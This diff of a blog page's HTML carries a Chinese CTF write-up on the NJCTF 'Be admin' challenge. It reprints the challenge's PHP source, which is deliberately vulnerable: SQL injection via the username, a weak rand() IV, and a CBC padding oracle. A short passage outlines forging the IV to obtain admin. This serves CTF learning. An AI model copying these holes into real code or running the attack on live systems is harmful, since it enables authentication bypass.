@@ -1,4 +1,4 @@
-<!doctype html>
+<!DOCTYPE html>
 
 
 
@@ -10,11 +10,19 @@
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
 
 
 
 <meta http-equiv="Cache-Control" content="no-transform" />
 <meta http-equiv="Cache-Control" content="no-siteapp" />
+
 
 
 
@@ -68,7 +76,18 @@
 
 <link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
 
 
   <meta name="keywords" content="CBC,NJCTF,Padding Oracle," />
@@ -76,11 +95,6 @@
 
 
 
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/ico/favicon.ico?v=5.1.0" />
 
 
 
@@ -109,11 +123,13 @@
   var CONFIG = {
     root: '/',
     scheme: 'Pisces',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
     fancybox: true,
-    motion: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     duoshuo: {
-      userId: 'undefined',
+      userId: '0',
       author: '博主'
     },
     algolia: {
@@ -134,11 +150,7 @@
 
 
 
-  <title> NJCTF Padding Oracle攻击利用 | Ethan' Blog </title>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
+  <title>NJCTF Padding Oracle攻击利用 | Ethan' Blog</title>
   
 
 
@@ -147,28 +159,17 @@
 
 
 
-  <script type="text/javascript">
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "//tajs.qq.com/stats?sId=63078337";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
 
+</head>
 
-
-
-
-
-
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
   
     
   
 
-  <div class="container one-collumn sidebar-position-left page-post-detail ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -215,7 +216,7 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
+          <a href="/archives/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
@@ -225,7 +226,7 @@
       
         
         <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
+          <a href="/categories/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
             
@@ -235,7 +236,7 @@
       
         
         <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
+          <a href="/tags/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
             
@@ -245,7 +246,7 @@
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
+          <a href="/about/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
@@ -281,7 +282,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+      <input autocomplete="off"
              placeholder="搜索..." spellcheck="false"
              type="text" id="local-search-input">
     </div>
@@ -315,7 +316,11 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.beesfun.com/2017/03/12/NJCTF-Padding-Oracle攻击利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -333,14 +338,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                NJCTF Padding Oracle攻击利用
-              
-            
-          </h1>
+          <h1 class="post-title" itemprop="name headline">NJCTF Padding Oracle攻击利用</h1>
         
 
         <div class="post-meta">
@@ -388,6 +386,16 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/03/12/NJCTF-Padding-Oracle攻击利用/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2017/03/12/NJCTF-Padding-Oracle攻击利用/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -403,7 +411,9 @@
       </header>
     
 
-
+    
+    
+    
     <div class="post-body" itemprop="articleBody">
 
       
@@ -415,43 +425,55 @@
 <blockquote>
 <p>题目: Be admin</p>
 </blockquote>
-<img src="/2017/03/12/NJCTF-Padding-Oracle攻击利用/desc.png" alt="desc.png" title="">
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"......"</span>);</div><div class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</div><div class="line"></div><div class="line">session_start();</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</div><div class="line">    $random_token=<span class="string">''</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</div><div class="line">        $random_token.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">global</span> $defaultId;</div><div class="line">    $j = $defaultId;</div><div class="line">    $token = get_random_token();    <span class="comment">// IV</span></div><div class="line">    $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</div><div class="line">    setcookie(<span class="string">"ID"</span>, base64_encode($c));</div><div class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</div><div class="line">    <span class="keyword">if</span> ($j === <span class="string">'admin'</span>) &#123;</div><div class="line">        $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">false</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"token"</span>]))</div><div class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</div><div class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</div><div class="line">        <span class="keyword">if</span> ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE[<span class="string">"token"</span>]))) &#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">true</span>;</div><div class="line">            &#125; <span class="keyword">else</span> $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">false</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($encrypted_pass, $pass)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $encrypted_pass = base64_decode($encrypted_pass);</div><div class="line">    $iv = substr($encrypted_pass, <span class="number">0</span>, <span class="number">16</span>);</div><div class="line">    $cipher = substr($encrypted_pass, <span class="number">16</span>);</div><div class="line">    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</div><div class="line">    <span class="keyword">return</span> $password == $pass;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">need_login</span><span class="params">($message = NULL)</span> </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"   &lt;!doctype html&gt;</span></div><div class="line"><span class="string">        &lt;html&gt;</span></div><div class="line"><span class="string">        &lt;head&gt;</span></div><div class="line"><span class="string">        &lt;meta charset=\"UTF-8\"&gt;</span></div><div class="line"><span class="string">        &lt;title&gt;Login&lt;/title&gt;</span></div><div class="line"><span class="string">        &lt;link rel=\"stylesheet\" href=\"CSS/target.css\"&gt;</span></div><div class="line"><span class="string">            &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"&gt;&lt;/script&gt;</span></div><div class="line"><span class="string">        &lt;/head&gt;</span></div><div class="line"><span class="string">        &lt;body&gt;"</span>;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($message)) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"  &lt;div&gt;"</span> . $message . <span class="string">"&lt;/div&gt;\n"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;form method=\"POST\" action=''&gt;</span></div><div class="line"><span class="string">            &lt;div class=\"body\"&gt;&lt;/div&gt;</span></div><div class="line"><span class="string">		        &lt;div class=\"grad\"&gt;&lt;/div&gt;</span></div><div class="line"><span class="string">		            &lt;div class=\"header\"&gt;</span></div><div class="line"><span class="string">			            &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;</span></div><div class="line"><span class="string">		            &lt;/div&gt;</span></div><div class="line"><span class="string">		            &lt;br&gt;</span></div><div class="line"><span class="string">		            &lt;div class=\"login\"&gt;</span></div><div class="line"><span class="string">                        &lt;input type=\"text\" placeholder=\"username\" name=\"username\"&gt;</span></div><div class="line"><span class="string">                        &lt;input type=\"password\" placeholder=\"password\" name=\"password\"&gt;               </span></div><div class="line"><span class="string">                        &lt;input type=\"submit\" value=\"Login\"&gt;</span></div><div class="line"><span class="string">                    &lt;/div&gt;</span></div><div class="line"><span class="string">                     &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt;</span></div><div class="line"><span class="string">            &lt;/form&gt;</span></div><div class="line"><span class="string">        &lt;/body&gt;</span></div><div class="line"><span class="string">    &lt;/html&gt;"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;!doctype html&gt;</span></div><div class="line"><span class="string">&lt;html&gt;</span></div><div class="line"><span class="string">&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;</span></div><div class="line"><span class="string">&lt;body&gt;"</span>;</div><div class="line">    <span class="keyword">global</span> $flag;</div><div class="line">    printf(<span class="string">"Hello ~~~ ctfer! "</span>);</div><div class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"isadmin"</span>])</div><div class="line">        <span class="keyword">echo</span> $flag;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;div&gt;&lt;a href=\"logout.php\"&gt;Log out&lt;/a&gt;&lt;/div&gt;</span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;"</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</div><div class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</div><div class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</div><div class="line">    $query = <span class="string">"SELECT username, encrypted_pass from users WHERE username='$username'"</span>;</div><div class="line">    $res = $conn-&gt;query($query) <span class="keyword">or</span> trigger_error($conn-&gt;error . <span class="string">"[$query]"</span>);</div><div class="line">    <span class="keyword">if</span> ($row = $res-&gt;fetch_assoc()) &#123;</div><div class="line">        $uname = $row[<span class="string">'username'</span>];</div><div class="line">        $encrypted_pass = $row[<span class="string">"encrypted_pass"</span>];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($row &amp;&amp; login($encrypted_pass, $password)) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"you are in!"</span> . <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">        get_identity();</div><div class="line">        show_homepage();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('login failed!');&lt;/script&gt;"</span>;</div><div class="line">        need_login(<span class="string">"Login Failed!"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    test_identity();</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">"id"</span>])) &#123;</div><div class="line">        show_homepage();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        need_login();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<img src="/2017/03/12/NJCTF-Padding-Oracle攻击利用/desc.png">
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"......"</span>);</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_token=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_token.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $defaultId;</span><br><span class="line">    $j = $defaultId;</span><br><span class="line">    $token = get_random_token();    <span class="comment">// IV</span></span><br><span class="line">    $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</span><br><span class="line">    setcookie(<span class="string">"ID"</span>, base64_encode($c));</span><br><span class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</span><br><span class="line">    <span class="keyword">if</span> ($j === <span class="string">'admin'</span>) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"token"</span>]))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="keyword">if</span> ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE[<span class="string">"token"</span>]))) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</span><br><span class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> $_SESSION[<span class="string">'isadmin'</span>] = <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($encrypted_pass, $pass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $encrypted_pass = base64_decode($encrypted_pass);</span><br><span class="line">    $iv = substr($encrypted_pass, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    $cipher = substr($encrypted_pass, <span class="number">16</span>);</span><br><span class="line">    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    <span class="keyword">return</span> $password == $pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">need_login</span><span class="params">($message = NULL)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"   &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=\"UTF-8\"&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;link rel=\"stylesheet\" href=\"CSS/target.css\"&gt;</span></span><br><span class="line"><span class="string">            &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($message)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"  &lt;div&gt;"</span> . $message . <span class="string">"&lt;/div&gt;\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;form method=\"POST\" action=''&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=\"body\"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">		        &lt;div class=\"grad\"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">		            &lt;div class=\"header\"&gt;</span></span><br><span class="line"><span class="string">			            &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">		            &lt;/div&gt;</span></span><br><span class="line"><span class="string">		            &lt;br&gt;</span></span><br><span class="line"><span class="string">		            &lt;div class=\"login\"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"text\" placeholder=\"username\" name=\"username\"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=\"password\" placeholder=\"password\" name=\"password\"&gt;               </span></span><br><span class="line"><span class="string">                        &lt;input type=\"submit\" value=\"Login\"&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                     &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;"</span>;</span><br><span class="line">    <span class="keyword">global</span> $flag;</span><br><span class="line">    printf(<span class="string">"Hello ~~~ ctfer! "</span>);</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"isadmin"</span>])</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;div&gt;&lt;a href=\"logout.php\"&gt;Log out&lt;/a&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    $query = <span class="string">"SELECT username, encrypted_pass from users WHERE username='$username'"</span>;</span><br><span class="line">    $res = $conn-&gt;query($query) <span class="keyword">or</span> trigger_error($conn-&gt;error . <span class="string">"[$query]"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($row = $res-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $uname = $row[<span class="string">'username'</span>];</span><br><span class="line">        $encrypted_pass = $row[<span class="string">"encrypted_pass"</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($row &amp;&amp; login($encrypted_pass, $password)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you are in!"</span> . <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        get_identity();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('login failed!');&lt;/script&gt;"</span>;</span><br><span class="line">        need_login(<span class="string">"Login Failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    test_identity();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">"id"</span>])) &#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        need_login();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>大致阅读下代码，可以看出程序逻辑，首先要通过用户认证，也就是说要登录成功，服务端会设置<code>$_SESSION[&quot;id&quot;]</code>, 这是后续Padding Oracle攻击的基础；<br><code>$_SESSION[&quot;id&quot;]</code>是<code>aes-128-cbc</code>加密后的密文，我们能获取初始向量IV,也就是<code>Cookie[&#39;token&#39;]</code>, 通过Padding Oracle攻击伪造IV使得解出来的明文为<code>admin</code>即可。</p>
